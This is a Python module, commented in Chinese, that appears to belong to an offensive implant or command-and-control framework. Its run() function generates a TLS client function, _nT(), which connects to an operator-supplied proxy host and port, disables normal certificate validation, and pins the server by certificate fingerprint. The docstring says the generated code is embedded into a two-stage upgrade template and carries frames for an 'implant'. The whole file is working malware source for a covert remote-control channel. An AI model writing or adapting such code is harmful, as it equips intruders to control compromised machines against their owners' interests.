"""
@module: transport_tls
@desc: 生成 TLS 传输实现代码（指纹 pin，零依赖）
@params: host port key_hex fingerprint
"""
MODULE = {
    "desc": "生成 TLS 传输实现代码（指纹 pin）",
    "params": [
        ("host", "必填，目标 proxy 地址"),
        ("port", "必填，目标 proxy 端口"),
        ("key_hex", "必填，proxy_key"),
        ("fingerprint", "必填，证书 sha256 指纹（hex）"),
    ],
}


def run(host, port, key_hex, fingerprint):
    """生成 _nT() 实现：TLS 客户端 + 证书指纹 pin。

    生成的代码由 uplevel 命令嵌入两阶段升级模板（transport_base）。
    _nT 返回已握手的 SSLSocket；帧收发沿用 implant 的 p()/q()。
    """
    host = str(host)
    port = int(port)
    fingerprint = str(fingerprint).strip().lower()

    code = f'''\
import ssl as _sl, hashlib as _hl, socket as _sa
def _nT():
    s = _sa.socket()
    s.settimeout(30)
    s.connect(({host!r}, {port}))
    ctx = _sl.SSLContext(_sl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _sl.CERT_NONE
    t = ctx.wrap_socket(s)
    der = t.getpeercert(binary_form=True)
    if _hl.sha256(der).hexdigest() != {fingerprint!r}:
        t.close()
        raise ConnectionError("tls fingerprint mismatch")
    return t
'''
    return code
